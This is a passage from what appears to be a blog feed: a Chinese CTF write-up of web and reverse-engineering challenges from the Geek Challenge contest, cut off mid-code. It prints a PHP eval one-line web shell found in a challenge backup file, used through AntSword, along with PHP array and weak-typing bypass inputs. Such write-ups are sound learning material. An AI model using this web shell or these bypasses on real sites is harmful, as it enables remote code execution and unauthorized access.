    <updated>2020-12-01T18:25:29.233Z</updated>
    
    <content type="html"><![CDATA[<p>1.修改host文件</p><pre><code>首先、Hosts它是一个没有扩展名的系统文件，而它的的基本作用就是将一些我们个人常用的网址和相对应的IP地址建立一个关联“数据库”。所以，当我们（也就是用户）在浏览器输入一个需要我们登录的网址时，我们的计算机系统会首先自动的从Hosts文件中寻找对应的IP地址。如果一旦找到对应的IP地址，我们的系统将会立即打开对应的网页；如果没有找到，这时候系统将会把网址交给DNS域名解析服务器进行IP地址的解析。而如果系统发现是被屏蔽的IP或域名，就会禁止打开此网页！</code></pre><p>2.设置代理服务器</p><pre><code>须送出Request信号来得到回答，然后对方再把信息以bit方式传送回来。代理服务器是介于浏览器和Web服务器之间的一台服务器，有了它之后，浏览器不是直接到Web服务器去取回网页而是向代理服务器发出请求，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。因此代理服务器仅作用于网页，在其他应用上仍使用的真实IP。</code></pre><p>3.使用vpn</p><pre><code>与代理服务器不同的是VPN可以为全局网络改变IP，其他与代理服务器类似。所以VPN是居家旅行，杀人越货的必要之选。：）</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.修改host文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;首先、Hosts它是一个没有扩展名的系统文件，而它的的基本作用就
是将一些我们个人常用的网址和相对应的IP地址建立一个关联“数据库”。
所以，当我们（也就是用户）在浏览器输入一个需要我们登录的网址
时，我们的计算机系统会首</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>极客大挑战wp</title>
    <link href="http://example.com/2020/11/30/ctf01/"/>
    <id>http://example.com/2020/11/30/ctf01/</id>
    <published>2020-11-30T15:33:36.813Z</published>
    <updated>2020-11-30T15:58:31.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web题"><a href="#web题" class="headerlink" title="web题"></a>web题</h2><h3 id="1-朋友的学妹"><a href="#1-朋友的学妹" class="headerlink" title="1.朋友的学妹"></a>1.朋友的学妹</h3><p>打开网址，右键鼠标，打开源文件，发现</p><pre><code>&lt;!--flag=U1lDe0YxQF80c19oNExwZnVsbGxsbGx9--&gt;</code></pre><p>用网站base64解码得到flag<br>SYC{F1@_4s_h4Lpfullllll}</p><h3 id="2-EZwww"><a href="#2-EZwww" class="headerlink" title="2.EZwww"></a>2.EZwww</h3><p>打开网址，说这个网站已经备份了，直接在网址后面加上/<a href="http://www.zip,发现开始下载一个压缩包,解压,有两个文件,一个是假的flag,一个是index.php,把index.php的后缀改为txt.打开发现/">www.zip，发现开始下载一个压缩包，解压，有两个文件，一个是假的flag，一个是index.php，把index.php的后缀改为txt。打开发现</a></p><pre><code>&lt;html&gt; &lt;head&gt;  &lt;title&gt;Lola&#39;s website1.0&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php echo &#39;&lt;h1&gt;welcome to my website&lt;/h1&gt;&#39;; ?&gt; &lt;?php echo &#39;&lt;p&gt;i will never forget to backup my website......&lt;/p&gt;&#39;; ?&gt; &lt;?php echo &#39;&lt;img src=&quot;img/lola.gif&quot; alt=&quot;welcome~&quot;/&gt;&#39;; ?&gt; &lt;/body&gt;&lt;/html&gt;&lt;?php$key1 = $_POST[&#39;a&#39;];$key2 = base64_decode(&#39;c3ljbDB2ZXI=&#39;);if($key1 === $key2)&#123;    //this is a true flagecho &#39;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;&#39;;&#125;?&gt;</code></pre><p>说以post提交a，然后要key1等于key2，key2还base64编码了，解码得到sycl0ver，然后用火狐浏览器（注意要下载一个插件Hackbar）以post提交a=sycl0ver，得到flag  SYC{Backup_1s_4_good_h4bit_l0l}</p><h3 id="3-刘壮的黑页"><a href="#3-刘壮的黑页" class="headerlink" title="3.刘壮的黑页"></a>3.刘壮的黑页</h3><p>这道题主要考post和get两个提交方式，不知道怎么回事，网站打不开了QAQ，反正就是用get方式提交一个东西，一个用post提交一个东西，就会得到flag</p><h3 id="4-Welcome"><a href="#4-Welcome" class="headerlink" title="4.Welcome"></a>4.Welcome</h3><p>打开网站，显示405错误，只不过不是题错了，而是要改用post提交一个东西才会显示一些东西，比如a=’1’，得到<br>     &lt;?php<br>    error_reporting(0);<br>    if ($_SERVER[‘REQUEST_METHOD’] !== ‘POST’) {<br>    header(“HTTP/1.1 405 Method Not Allowed”);<br>    exit();<br>    } else {</p><pre><code>    if (!isset($_POST[&#39;roam1&#39;]) || !isset($_POST[&#39;roam2&#39;]))&#123;        show_source(__FILE__);    &#125;    else if ($_POST[&#39;roam1&#39;] !== $_POST[&#39;roam2&#39;] &amp;&amp; sha1($_POST[&#39;roam1&#39;]) === sha1($_POST[&#39;roam2&#39;]))&#123;        phpinfo();  // collect information from phpinfo!    &#125;&#125; </code></pre><p>再次以post提交roam1[]=1&amp;roam2[]=2，一个绕过方式。会出现一个界面，从中找到一个可以位置    /f1444aagggg.php，在网址后面加上去，得到</p><pre><code>Not FoundThe requested URL was not found on this server.Apache/2.4.38 (Debian) Server at 49.234.224.119 Port 8000</code></pre><p>改为post请求发送，在消息头里面看到flag</p><pre><code>SYC&#123;w31c0m3_t0_5yc_r0@m_php1&#125;</code></pre><h3 id="5-我是大黑客"><a href="#5-我是大黑客" class="headerlink" title="5.我是大黑客"></a>5.我是大黑客</h3><p>这道题考的应该是一句话木马，打开网站，有提示说留下了一个备份文件，在网址后面加上/liuzhuang.php.bak。开始下载文件，把文件后缀名改为txt，打开，得到</p><pre><code>&lt;?phpeval($_POST[&#39;liuzhuang&#39;]);//谁是大恶人 那必定是我liuzhuang//当你的服务器看到 0xliuzhuang 就知道要买台新机器了?&gt;</code></pre><p>用蚁剑</p><p>输入URL，密码为上面的liuzhuang。得到flag</p><pre><code>SYC&#123;1iuzHuang_yyd_G0d!&#125;</code></pre><h3 id="6-ezbypass"><a href="#6-ezbypass" class="headerlink" title="6.ezbypass"></a>6.ezbypass</h3><pre><code>Please use a GET request to pass in the variables a and b, compare them with strcmp and let strcmp return a value of NULL.Note that a and b cannot be equal. </code></pre><p>请使用GET请求传入变量a和b，将它们与strcmp进行比较，并让strcmp返回NULL值。<br>注意a和b不能相等。用strcmp函数的漏洞绕过</p><p>以get方式提交?a[ ]=2&amp;b[ ]=4，然后得到</p><pre><code>OKOK,You got the first step.Please POST a variable c that is not a number to make it equal to 123 </code></pre><p>好吧，你迈出了第一步。请发布一个不是数字的变量c，使其等于123。开始我以为用ASCLL码就可以了，不行，用位运算使c=123，也不行。最后发现是php弱类型绕过。post提交c=123a，得到flag</p><pre><code>nice!!!You got itSYC&#123;php_4s_so_funny&#125; </code></pre><h2 id="re题目"><a href="#re题目" class="headerlink" title="re题目"></a>re题目</h2><h3 id="1-No-RE-no-gain"><a href="#1-No-RE-no-gain" class="headerlink" title="1.No RE no gain"></a>1.No RE no gain</h3><p>下载文件，直接拖到IDA里面，shift+f12查看字符串，有很多假的flag，例如</p><pre><code>.rdata:0040400C    0000001F    C    SYC&#123;5ay_He1lo_tH3_Re_W0rld!!!&#125;.rdata:0040402C    0000001F    C    SYC&#123;Say_h3llo_th3_rE_World!!!&#125;.rdata:0040404C    0000001F    C    SYC&#123;s4y_he110_The_RE_w0r1d!!!&#125;.rdata:0040406C    0000001F    C    SYC&#123;S4y_He11o_th3_RE_World!!!&#125;.rdata:0040408C    0000001F    C    SYC&#123;s4y_He110_The_rE_w0r1d~~~&#125;.rdata:004040AC    0000001F    C    SYC&#123;say_h3ll0_Th3_RE_w0rld!!!&#125;.rdata:004040CC    0000001F    C    SYC&#123;s4y_he110_th3_rE_w0rld~~~&#125;.rdata:004040EC    0000001F    C    SYC&#123;s4y_he11o_The_r3_wor1d!!!&#125;.rdata:0040410C    0000001F    C    SYC&#123;Say_He110_th3_r3_w0r1d!!!&#125;.rdata:0040412C    0000001F    C    SYC&#123;say_He11o_The_rE_wor1d!!!&#125;.rdata:0040414C    0000001F    C    SYC&#123;say_he11o_the_r3_Wor1d~~~&#125;.rdata:0040416C    0000001F    C    SYC&#123;Say_He110_The_rE_w0r1d~~~&#125;.rdata:0040418C    0000001F    C    SYC&#123;S4y_H3110_th3_RE_World!!~&#125;</code></pre><p>真正的flag在，.rdata:00404277    0000001A    C    Great! Here is your flag:，点进去，找到位置ctrl+x，到真正的flag处。得到</p><pre><code>SYC&#123;S4y_He11o_th3_RE_World!!!&#125;</code></pre><h3 id="2-我真不会写驱动！"><a href="#2-我真不会写驱动！" class="headerlink" title="2.我真不会写驱动！"></a>2.我真不会写驱动！</h3><p>不知道是不是题有问题，直接拖到IDA里面，shift+f12查看字符串，就有了flag</p><pre><code>SYC&#123;First_Win64_DRIVER&#125;</code></pre><h3 id="3-WhatsApk"><a href="#3-WhatsApk" class="headerlink" title="3.WhatsApk"></a>3.WhatsApk</h3><p>APK实际上就是一个备份文件，解压后，得到一些文件，网上搜一搜apk文件结构，了解了解。</p><p>取巧做法将全部文件后缀名改为txt，然后一个一个文件的搜索SYC，得到flag</p><pre><code>SYC&#123;WelC0me_to_android!&#125;</code></pre><p>实际上估计应该是要用jed软件，然后在jeb里面搜索，下一道题就会用到。</p><h3 id="4-HelloAndroid"><a href="#4-HelloAndroid" class="headerlink" title="4.HelloAndroid"></a>4.HelloAndroid</h3><p>首先安装jed，挺难找软件的，安好了还要安个Java。</p><p>安装好了，把class.dex文件直接拖到jeb里面，然后点字符串，搜索SYC,得到</p><pre><code>SYC&#123;Android_in_Java_is_easy!&#125;</code></pre><h3 id="5-re00"><a href="#5-re00" class="headerlink" title="5.re00"></a>5.re00</h3><p>考点：异或<br>要先到IDA里面看，shift+12,点进去可以的地方，ctrl+x，然后f5，看伪代码，关键点为</p><pre><code>if ( (char)(buf[i] ^ 0x44) != byte_4060[i] )//buf[i]就是输入的flag，然后和0x44进行了一个异或运算，得到了byte_4060[i]。</code></pre><p>点开byte_4060[i]，其值为</p><pre><code>byte_4060       db 17h, 1Dh, 7, 3Fh, 37h, 2Dh, 29h, 34h, 28h, 21h, 1Bh.data:0000000000004060                                         ; DATA XREF: main+93↑o.data:0000000000004060                 db 37h, 2Dh, 29h, 34h, 28h, 21h, 1Bh, 3Ch, 2Bh, 3 dup(36h).data:0000000000004060                 db 1Bh, 36h, 2Dh, 23h, 2Ch, 30h, 2 dup(7Bh), 39h</code></pre><p>需要知道dup代表的是什么，然后异或回去就行<br>脚本如下</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */int main(int argc, char *argv[]) &#123;    signed int i; // [rsp+8h] [rbp-48h]    int buf[32]; // [rsp+10h] [rbp-40h]    int byte_4060[32]=&#123;0x17,0x1D,0x07,0x3F,0x37,0x2D,0x29,0x34,0x28,0x21,0x1B,0x37,0x2D,0x29,0x34,0x28,0x21,0x1B,0x3C,0x2B,0x36,0x36,0x36,0x1B,0x36,0x2D,0x23,0x2C,0x30,0x7B,0x7B,0x39&#125;;//从IDA中得到byte_4060的16进制数串 后面有一串字符 但是不像flag，发现if里面用异或运算编码了，写脚本来解码。  for ( i = 0; i &lt;= 31; ++i )  &#123;     buf[i]=byte_4060[i] ^0x44;//解码  &#125;  for(i=0;i&lt;=31;i++)  &#123;      printf(&quot;%x &quot;,buf[i]);//可改为printf(&quot;%c&quot;,buf[i]);直接得到字符串  &#125;  printf(&quot;\n&quot;);  //得到解码后的16进制数串，将其转换为字符串，得到flag。  puts(&quot;yes! you get it!&quot;);  return 0LL;&#125;</code></pre><p>得到flag</p><pre><code>SYC&#123;simple_simple_xorrr_right??&#125;</code></pre><h3 id="6-maze"><a href="#6-maze" class="headerlink" title="6.maze"></a>6.maze</h3><p>首先还是用IDA打开，shift+12搜索字符串，发现tttttttttttttttql!!!十分可疑，点进去，Ctrl+x进入主函数，F5生成伪代码，如下</p><pre><code>int sub_401A10()&#123;  int v0; // ecx  int v1; // eax  int v2; // esi  char *v3; // ecx  unsigned int v4; // kr00_4  int v5; // eax  char v6; // cl  char v8[108]; // [esp+8h] [ebp-70h]  char v9[108]; // [esp+9h] [ebp-6Fh]  sub_402400(dword_431974);  sub_401CB0(v0, &quot;give me your way:&quot;);  sub_406FD0(v8, 0, 100);  v1 = sub_409A97(0);  sub_409E54(v1);  sub_401100(&quot;%64s&quot;, (unsigned int)v8);  v2 = 0;  v3 = v9;  v4 = strlen(v8);  if ( v4 )  &#123;v5 = dword_431960;while ( 1 )&#123;  v6 = v8[v2];  if ( v6 == 97 )break;  switch ( v6 )  &#123;case 119:  v5 -= 31;  goto LABEL_11;case 115:  v5 += 31;  goto LABEL_11;case 100:  ++v5;  goto LABEL_11;  &#125;LABEL_12:  LOBYTE(v3) = byte_42E820[v5];  if ( (_BYTE)v3 == 111 )  &#123;sub_401CB0(v3, &quot;Ur not on the way!!&quot;);sub_4099B9(0);LABEL_17:sub_401CB0(v3, &quot;ttttttttttttttttttttql!!&quot;);sub_4099B9(0);JUMPOUT(*(_DWORD *)algn_401B14);  &#125;  if ( (_BYTE)v3 == 69 )goto LABEL_17;  if ( ++v2 &gt;= v4 )return 0;&#125;--v5;LABEL_11:dword_431960 = v5;goto LABEL_12;  &#125;  return 0;&#125;</code></pre><p>百度搜索：ctf 迷宫问题，<a href="https://wiki.x10sec.org/reverse/maze/maze/" title="maze ctf">https://wiki.x10sec.org/reverse/maze/maze/</a>发现与这道题有相识之处，从而知道</p><pre><code>.rdata:0042E821&#39;__________ooooo_____o________o_ooooooooo__ooo__ooo_oooooooooo_ooo&#39;.rdata:0042E821 db &#39;ooooooo__o__oooo_oooooooooo________oooo___ooooo_ooooooooooooooooo&#39;.rdata:0042E821 db &#39;_oooooooooooo_ooooooooooooooooo_ooooo_oooooo_ooooooooooooooooo_oo&#39;.rdata:0042E821 db &#39;ooo_oooooo_oooooooooos_______ooooo_oooooo__________Eooooooooooooo&#39;.rdata:0042E821 db &#39;oooooooooooooooooo&#39;,0</code></pre><p>代表的是迷宫，用shift+e调出迷宫，发现迷宫数据，但是需要知道迷宫的长宽，我的做法是先调为16进制，通过拉扯边框的大小使里面数据成为一个矩形，发现变成9*31时恰好是个矩形！！！！，并且按照5F走迷宫的确有一条路。</p><p>再看主函数，发现</p><pre><code>v5 -= 31;v5 += 31;</code></pre><p>中的31相当之可疑，发现这原来是1维数组变2维数组，每31个就换行。16进制的图十分不好看，换一下<br>    #include&lt;stdio.h&gt;</p><pre><code>int main(void)&#123;    int i,j;    int a[9][31]=&#123;   95,  95,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111, 111,  95,  95,  95,  95,  95,   111,  95,  95,  95,  95,  95,  95,  95,  95, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95,  95, 111, 111, 111,  95,  95, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95, 111,  95,  95, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111,  95,  95,  95, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111,  95, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111,  95, 111, 111,   111, 111, 111, 111,  95, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111,  95, 111,   111, 111, 111, 111, 111,  95, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 115,  95,  95,  95,    95,  95,  95,  95, 111, 111, 111, 111, 111,  95,   111, 111, 111, 111, 111, 111,  95,  95,  95,  95,    95,  95,  95,  95,  95,  95,  69, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111,0 &#125;;  for(i=0;i&lt;9;i++)  &#123;      for(j=0;j&lt;31;j++)      &#123;          printf(&quot;%c&quot;,a[i][j]);    &#125;    printf(&quot;\n&quot;);  &#125;&#125; </code></pre><p>发现运行后不对</p><pre><code>__________ooooo_____o________o_ooooooooo__ooo__ooo_oooooooooo_oooooooooo__o__oooo_oooooooooo________oooo___ooooo_ooooooooooooooooo_oooooooooooo_ooooooooooooooooo_ooooo_oooooo_ooooooooooooooooo_ooooo_oooooo_oooooooooos_______ooooo_oooooo__________Eooooooooooooooooooooooooooooooo--------------------------------Process exited after 0.1652 seconds with return value 0请按任意键继续. . .</code></pre><p>迷宫怎么会缺了一个角。观察地图，最右边那一列如果移到左边不就感觉更好了，感觉应该是少了一个，添上去，c代码如下<br>    #include&lt;stdio.h&gt;</p><pre><code>int main(void)&#123;    int i,j;    int a[9][31]=&#123;   95,95,  95,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111, 111,  95,  95,  95,  95,  95,   111,  95,  95,  95,  95,  95,  95,  95,  95, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95,  95, 111, 111, 111,  95,  95, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95, 111,  95,  95, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95,  95,  95,  95,  95,  95,  95,  95,   111, 111, 111, 111,  95,  95,  95, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,    95, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111,  95, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111,  95, 111, 111, 111, 111, 111,  95, 111, 111,   111, 111, 111, 111,  95, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111,  95, 111, 111, 111, 111, 111,  95, 111,   111, 111, 111, 111, 111,  95, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 115,  95,  95,  95,    95,  95,  95,  95, 111, 111, 111, 111, 111,  95,   111, 111, 111, 111, 111, 111,  95,  95,  95,  95,    95,  95,  95,  95,  95,  95,  69, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111, 111, 111,   111, 111, 111, 111, 111, 111, 111, 111,&#125;;  for(i=0;i&lt;9;i++)  &#123;      for(j=0;j&lt;31;j++)      &#123;          printf(&quot;%c&quot;,a[i][j]);    &#125;    printf(&quot;\n&quot;);  &#125;&#125;//（注意要把数组中最后的0去掉）</code></pre><p>运行</p><pre><code>___________ooooo_____o________o_ooooooooo__ooo__ooo_oooooooooo_oooooooooo__o__oooo_oooooooooo________oooo___ooooo_ooooooooooooooooo_oooooooooooo_ooooooooooooooooo_ooooo_oooooo_ooooooooooooooooo_ooooo_oooooo_oooooooooos_______ooooo_oooooo__________Eooooooooooooooooooooooooooooooo--------------------------------Process exited after 0.07231 seconds with return value 0请按任意键继续. . .</code></pre><p>迷宫准备就绪。感觉出题人相当有意思，SYC；迷宫中的s应该代表的是start起点，E应该代表的是end终点。实际上看主函数也可看出终点</p><pre><code>LABEL_17:sub_401CB0(v3, &quot;ttttttttttttttttttttql!!&quot;);sub_4099B9(0);JUMPOUT(*(_DWORD *)algn_401B14);  &#125;  if ( (_BYTE)v3 == 69 )//如果v3=69，也就是E，跳到LABEL_17，说ttttttttttttttql！！！说明是正确的终点goto LABEL_17;</code></pre><p>现在需要做的就是走迷宫，迷宫肯定需要方向，是什么呢？再看主函数</p><pre><code>  v6 = v8[v2];  if ( v6 == 97 )//‘a’=97,--v5不就代表向左移动吗       --v5;//做了一点改动  switch ( v6 )  &#123;case 119://&#39;199&#39;=w，v5 -= 31不就是向上移动吗  v5 -= 31;  goto LABEL_11;case 115://‘115’=s，  v5 += 31不就是向下移动吗  v5 += 31;  goto LABEL_11;case 100://&#39;100&#39;=d,++5不就表示向右移动吗  ++v5;  goto LABEL_11;  &#125;</code></pre><p>感觉出题人，非常人性化，知道打游戏这几个键最常用QAQ。tqltqltql<br>开始走迷宫，得到flag(注意s和E不算)</p><p>得到flag：SYC{dddddddwwwwaaaaaaawwwddddddddddsdsdsddwdwdwddddsssssssdddddddddd}</p><h3 id="7-Hello-NET"><a href="#7-Hello-NET" class="headerlink" title="7.Hello .NET"></a>7.Hello .NET</h3><h4 id="一-反编译"><a href="#一-反编译" class="headerlink" title="一.反编译"></a>一.反编译</h4><p>文件下载下来是个可执行文件，需要反编译来看代码</p><p>首先下载反编译软件<br><a href="https://www.cnblogs.com/heibai-ma/p/12893654.html">https://www.cnblogs.com/heibai-ma/p/12893654.html</a></p><p>然后看如何反编译<br><a href="https://blog.csdn.net/ajwqb06628/article/details/102071245?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare">https://blog.csdn.net/ajwqb06628/article/details/102071245?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.compare</a></p><h4 id="二-分析代码"><a href="#二-分析代码" class="headerlink" title="二.分析代码"></a>二.分析代码</h4><p>反编译后得到的关键代码如下(需要自己去在反编译出来的文件里面找找)<br>    public class MainWindow : Window, IComponentConnector<br>    {<br>        internal TextBox InputBox;<br>        internal Button Check_Btn;<br>        internal TextBlock Status;<br>        private bool _contentLoaded;</p><pre><code>    public MainWindow()    &#123;        this.InitializeComponent();    &#125;    private void Check(object sender, RoutedEventArgs e)    &#123;        int num;        string text = this.InputBox.Text;   //输入一个flag，也是要求的目标        List&lt;int&gt; list = new List&lt;int&gt;();   //  https://zhidao.baidu.com/question/539039145.html        int[] numArray = new int[] &#123;             0x12, 14, 40, -14, -2, 30, 10, 0x2a, 0x23, 0x30, 0x2b, 0x31, 0x34, 0x48, 0x39, 0x44,            0x56, 0x91, 0x73, 0x80, 0x73, 0x56        &#125;;//长度为22        for (num = 0x63; list.Count &lt; text.Length; num += 2)        //0x63=99，   list.Count &lt; text.Length，意思是要list[num]这个数组的长度和list.text[]数组长度一样，实际上list[num]，text[num]，numArray[num]的长度都要一样，都为22.                 &#123;            bool flag2 = true;  //布尔变量            for (int i = 3; i &lt; num; i += 2)//这个循环就是为了求list[num]这个数组。和求素数基本差不多，有点不一样。            &#123;                if ((num % i) == 0)                &#123;                    flag2 = false;                    break;                &#125;            &#125;            if (flag2)            &#123;                list.Add(num);   // 得到list[num]这个下面要用的数组            &#125;        &#125;        bool flag = true;        for (num = 0; (num &lt; text.Length) &amp;&amp; (num &lt; numArray.Length); num++)        &#123;            if ((list[num] - text[num]) != numArray[num])  //  不等于的话，flag=false，就说明错了，说明等于的时候才是对的，意思是flag  text[num]=list[num]-numArray[num]            &#123;                flag = false;                break;            &#125;        &#125;        if ((text.Length == numArray.Length) &amp; flag)        &#123;            this.Status.Foreground = new SolidColorBrush(Colors.Green);            this.Status.Text = &quot;Flag is corrent&quot;;        &#125;        else        &#123;            this.Status.Foreground = new SolidColorBrush(Colors.Red);            this.Status.Text = &quot;Flag is incorrent&quot;;        &#125;    &#125;</code></pre><h4 id="三-写脚本"><a href="#三-写脚本" class="headerlink" title="三.写脚本"></a>三.写脚本</h4><p>脚本1</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int num;    char a[22]=&#123;0,&#125;;    int b[22]=&#123;18,14,40,-14,-2,30,10,42,35,48,43,49,52,72,57,68,86,145,115,128,115,86&#125;;    int c[22]=&#123;0,&#125;;    int len=100;    int flag2,i,j,n;     for(num=99,j=0;j&lt;60;num+=2,j++)    &#123;        n=0;        flag2=1;        for(i=3;i&lt;num;i+=2)        &#123;            if(num%i==0)            &#123;            flag2=0;            break;            &#125;            &#125;        if(flag2)        &#123;    c[n]=num;            printf(&quot;%d &quot;,c[n]);            n++;//得到c[]=&#123;101 103 107 109 113 127 131 137 139 149 151 157 163 167 173 179 181 191 193 197 199 211&#125;         &#125;//                b[]=&#123;18,14,40,-14,-2,30,10,42,35,48,43,49,52,72,57,68,86,145,115,128,115,86&#125;;    &#125;//    printf(&quot;\n&quot;);//    for(num=0;num&lt;22;num++)//    &#123;//        a[num]=c[num]-b[num];//        printf(&quot;%d &quot;,a[num]);//     &#125; //    //    &#125;</code></pre><p>脚本2</p><pre><code>#include&lt;stdio.h&gt;int main(void) &#123;    int a[22]=&#123;18,14,40,-14,-2,30,10,42,35,48,43,49,52,72,57,68,86,145,115,128,115,86&#125;;    int b[22]=&#123;101 ,103 ,107 ,109 ,113 ,127 ,131 ,137 ,139 ,149 ,151 ,157 ,163, 167 ,173 ,179 ,181 ,191 ,193 ,197 ,199 ,211&#125;;    int c[22]=&#123;0&#125;;    int i;    for(i=0;i&lt;22;i++)    &#123;        c[i]=b[i]-a[i];        printf(&quot;%c&quot;,c[i]);    &#125;&#125;</code></pre><p>得到flag<br>SYC{say_hello_to_.NET}</p><h3 id="8-刘壮的BaseXX"><a href="#8-刘壮的BaseXX" class="headerlink" title="8.刘壮的BaseXX"></a>8.刘壮的BaseXX</h3><h4 id="一-调试与代码分析"><a href="#一-调试与代码分析" class="headerlink" title="一.调试与代码分析"></a>一.调试与代码分析</h4><p>拿到exe文件，直接拖到IDA里面看伪代码，如下</p><pre><code>__int64 sub_1400014E0()&#123;  void *v1; // [rsp+28h] [rbp-B0h]//定义了一个数组  signed __int64 v2; // [rsp+30h] [rbp-A8h] //一个整型变量，应该是数组的长度  char v3[128]; // [rsp+40h] [rbp-98h]//又定义了一个数组  memset(v3, 0, sizeof(v3));  v1 = (void *)sub_140004EF4(256i64);  sub_140003498(aYouMightKnowBa);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_140001060((__int64)aInputYourFlag);//叫你输入flag      sub_140004ED8((__int64)v3, 128i64);//将flag赋给v3      v2 = -1i64;      do        ++v2;      while ( v3[v2] );//应该算v2的值，计算数组长度      sub_140001420((__int64)v3, v2);//第一步加密，异或和位运算，需要进一步看子函数。      memset(v1, 0, 0x100ui64);      sub_1400010E0((__int64)v3, (__int64)v1, v2);//改了base64编码索引表的加密方式，将v3再次加密，需要进一步看子函数。      if ( v1 )        break;      sub_140003498(aUnExpectedErro);    &#125;    if ( (unsigned int)sub_140001490((unsigned __int8 *)v1) )//将最后的v1和设定的字符串进行比较，如果对了就会跳出循环，说明正确，设定的字符串为 maj7TmztjquUN8Xm-hKplvaYfEAxrUnIc51qxlKOwCKN4XsdzBmjOd_-  ，长度为56，也可通过这个来计算v3长度为42。      break;    sub_140001060((__int64)aWrongFlagTryAg);  &#125;  sub_140001060((__int64)aCorrectYouAreR);  sub_140004EE0(v1);  sub_140004C24(aPause);  return 0i64;&#125;</code></pre><p>重要子函数1</p><pre><code>__int64 __fastcall sub_140001420(__int64 a1, unsigned int a2)//a1是v3，也就是加密后的，v2是数组长度。&#123;  __int64 result; // rax  signed int i; // [rsp+4h] [rbp-14h]  for ( i = 0; ; ++i )  &#123;    result = a2;    if ( i &gt;= (signed int)a2 )      break;    *(_BYTE *)(a1 + i) = i ^ ((*(_BYTE *)(a1 + i) &gt;&gt; 4) | 16 * *(_BYTE *)(a1 + i));//加密方式，注意其中的16*，意思是&lt;&lt;4,如果是8*的话，是&lt;&lt;3。  &#125;  return result;&#125;</code></pre><p>重要子函数2，整体的加密过程不做过多分析</p><pre><code>__int64 __fastcall sub_1400010E0(__int64 a1, __int64 a2, int a3)//a1是v3，是加密前的，a2是v2是加密后的，a3是原来的长度。&#123;  int v3; // ST00_4  int v4; // ST00_4  int v5; // ST00_4  int v7; // [rsp+0h] [rbp-18h]  int v8; // [rsp+4h] [rbp-14h]  int v9; // [rsp+8h] [rbp-10h]  v9 = a3 % 3;  v8 = 0;  v7 = 0;  while ( v8 &lt; a3 - v9 )  &#123;    *(_BYTE *)(a2 + v7) = aZyxwvutsrqponm[(signed int)*(unsigned __int8 *)(a1 + v8) &gt;&gt; 2];    v3 = v7 + 1;    *(_BYTE *)(a2 + v3++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 1) &amp; 0xF0) &gt;&gt; 4) | 16 * (*(_BYTE *)(a1 + v8) &amp; 3)];    *(_BYTE *)(a2 + v3++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 2) &amp; 0xC0) &gt;&gt; 6) | 4                                                                                    * (*(_BYTE *)(a1 + v8 + 1) &amp; 0xF)];  //4*是&lt;&lt;2。    *(_BYTE *)(a2 + v3) = aZyxwvutsrqponm[*(_BYTE *)(a1 + v8 + 2) &amp; 0x3F];    v7 = v3 + 1;    v8 += 3;  &#125;  if ( v9 == 1 )  &#123;    *(_BYTE *)(a2 + v7) = aZyxwvutsrqponm[(signed int)*(unsigned __int8 *)(a1 + v8) &gt;&gt; 2];    v4 = v7 + 1;    *(_BYTE *)(a2 + v4++) = aZyxwvutsrqponm[((*(_BYTE *)(a1 + v8 + 1) &amp; 0xF0) &gt;&gt; 4) | 16 * (*(_BYTE *)(a1 + v8) &amp; 3)];    *(_BYTE *)(a2 + v4++) = 61;    *(_BYTE *)(a2 + v4) = 61;//两个61代表加两个==    v7 = v4 + 1;  &#125;  else if ( v9 == 2 )  &#123;    